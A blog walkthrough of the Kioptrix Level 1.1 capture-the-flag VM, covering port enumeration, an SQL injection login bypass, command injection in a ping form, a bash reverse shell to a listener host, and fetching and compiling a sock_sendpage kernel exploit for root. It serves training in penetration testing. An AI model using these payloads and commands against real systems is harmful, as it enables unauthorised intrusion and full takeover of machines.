---
layout: blog_item
title:  "Kioptrix Level 1.1 Walkthrough"
date:   2013-12-20 14:00:10
author: Arr0way
description: 'Kioptrix Level 1.1 Walkthrough, CTF solution for Kioptrix Level 1.1'
categories: [walkthroughs]
tags:
- Kioptrix
---

<div class="coffee-rating">
<table>
      <tbody>
        <tr>
           <td>
               <p><code>Coffee Difficulty Rating:</code></p>
           </td>
           <td>
               <p><i class="fa fa-coffee"></i></p>
           </td>
        </tr>
      </tbody>
</table>
</div>

* list element with functor item
{:toc}

## Author Description

The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.

## Service Enumeration

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Port</th>
      <th>Service</th>
      <th>Version Detection</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><code>TCP: 22</code></p></pc>
           </td>
           <td>
               <pc><p>SSH</p></pc>
           </td>
           <td>
               <pc><p>OpenSSH 3.9p1 (protocol 1.99)</p></pc>
           </td>
        </tr>
        <tr>
           <td>
               <pc><p><code>TCP: 80</code></p></pc>
           </td>
           <td>
              <pc><p>HTTP</p></pc>
           </td>
           <td>
               <pc><p>Apache httpd 2.0.52 ((CentOS))</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 111</code></p></pc>
           </td>
           <td>
              <pc><p>RPC Bind</p></pc>
           </td>
           <td>
               <pc><p>N/A</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 443</code></p></pc>
           </td>
           <td>
              <pc><p>HTTPS</p></pc>
           </td>
           <td>
               <pc><p>Apache httpd 2.0.52 ((CentOS))</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 631</code></p></pc>
           </td>
           <td>
              <pc><p>CUPS</p></pc>
           </td>
           <td>
               <pc><p>CUPS 1.1</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 946</code></p></pc>
           </td>
           <td>
              <pc><p>RPC</p></pc>
           </td>
           <td>
               <pc><p>RPC</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 3306</code></p></pc>
           </td>
           <td>
              <pc><p>MySQL</p></pc>
           </td>
           <td>
               <pc><p>MySQL (unauthorized)</p></pc>
           </td>
        </tr>

      </tbody>

</table>
</div>


## Web Application Investigation

The web form <code>/index.php</code> was vulnerable to [SQL injection](/penetration-testing/web-app/sql-injection/), entering the username <code>admin</code> and the password <code>' or '1'=' </code> successfully bypassed auth.  


![SQL Injection Auth Bypass](/img/blog/kioptrix/sql-injection-1-1.png)


<div class="note info">
  <h5>SQL Injection - Why does ' or '1'='1 work ?</h5>
  <p>

  The web application is expecting the SQL query:

  <code>$query = "SELECT * FROM users WHERE username = 'admin' AND password='blah'";</code>

  Entering the above <b>injects</b> the statement after the <code>password='blah'</code> and before the closing <code>";</code>, the entire sql injection query looks like:

  <code>$query = "SELECT * FROM users WHERE username = 'admin' AND password=' or '1'='1";"</code>

  <code>1 = 1</code> will always be <code>1</code>, thus the statement will return true, allowing an attacker to authenticate as admin. The above injection statement correctly closes the sql syntax, however it is possible to comment out the rest of the sql statement using: <code> -- -</code>

  </p>
</div>

![Command Injection](/img/blog/kioptrix/command-injection.png)

The above authentication bypass exposed a web form vulnerable to <b>command injection</b>, the form filtering only checks for the presence of the ping command with no filtering to prevent an attacker tacking a comment on the end using <code>; insert-command-here</code>.

## Non privileged shell

A non privileged reverse shell was obtained using:

{% highlight bash %}

ping google.com; bash -i >& /dev/tcp/192.168.221.139/443 0>&1

{% endhighlight %}

{% highlight bash %}
[root:~]# nc -n -v -l -p 443
listening on [any] 443 ...
connect to [192.168.221.139] from (UNKNOWN) [192.168.221.157] 32770
bash: no job control in this shell
bash-3.00$ id
uid=48(apache) gid=48(apache) groups=48(apache)
bash-3.00$
{% endhighlight %}

## Local privilege Escalation


{% highlight bash %}
bash-3.00$ uname -ar
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
bash-3.00$ cd /tmp
bash-3.00$ wget https://www.exploit-db.com/download/9545 --no-check-certificate
--02:27:58--  https://www.exploit-db.com/download/9545
           => `9545'
Resolving www.exploit-db.com... 192.124.249.8
Connecting to www.exploit-db.com|192.124.249.8|:443... connected.
WARNING: Certificate verification error for www.exploit-db.com: unable to get local issuer certificate
WARNING: certificate common name `*.mycloudproxy.com' doesn't match requested host name `www.exploit-db.com'.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [application/txt]

    0K .........                                                30.10 MB/s

02:27:58 (30.10 MB/s) - `9545' saved [9785]

bash-3.00$ mv 9545 sock_sendpage.c                             
bash-3.00$ gcc -o sock_sendpage sock_sendpage.c
bash-3.00$ ./sock_sendpage
sh: no job control in this shell
sh-3.00# id
uid=0(root) gid=0(root) groups=48(apache)
sh-3.00#
{% endhighlight %}

Thanks for the VM :)
